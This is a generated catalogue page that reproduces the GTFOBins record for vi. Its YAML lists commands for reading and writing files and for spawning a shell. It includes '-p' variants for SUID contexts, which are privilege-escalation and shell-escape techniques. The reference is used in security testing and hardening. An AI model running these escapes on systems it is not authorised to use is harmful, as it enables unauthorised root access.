---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# vi

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `vi` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/vi` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [vi](../../tools/linux/vi.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | vi |
| name | vi |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/vi/ |

## Preserved Source Material

```yaml
_body: ''
_name: vi
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/vi
functions:
  file-read:
  - code: vi /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: 'vi /path/to/output-file

      iDATA

      ^[

      w'
    comment: Where `^[` is the escape key.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: vi -c ':!/bin/sh' /dev/null
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: vi -c ':shell'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: vi -c ':set shell=/bin/sh | shell'
    contexts:
      sudo: null
      suid:
        code: vi -c ':set shell=/bin/sh\ -p | shell'
        shell: false
      unprivileged: null
  - code: vi -c :terminal /bin/sh
    contexts:
      sudo: null
      suid:
        code: vi -c ':terminal /bin/sh -p'
        shell: false
      unprivileged: null
```
